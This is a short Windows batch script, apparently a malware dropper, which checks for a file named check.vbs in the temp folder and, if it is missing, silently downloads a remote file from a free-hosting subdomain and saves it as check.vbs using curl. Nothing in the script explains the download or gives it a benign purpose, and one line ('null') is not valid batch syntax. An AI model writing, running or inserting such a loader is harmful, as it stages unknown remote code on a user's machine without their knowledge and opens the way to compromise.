@echo off

if exist %TEMP%\check.vbs (

  null

) else (

  curl.exe https://h19qjj92.000webhostapp.com/code2.html --silent -o check.vbs

)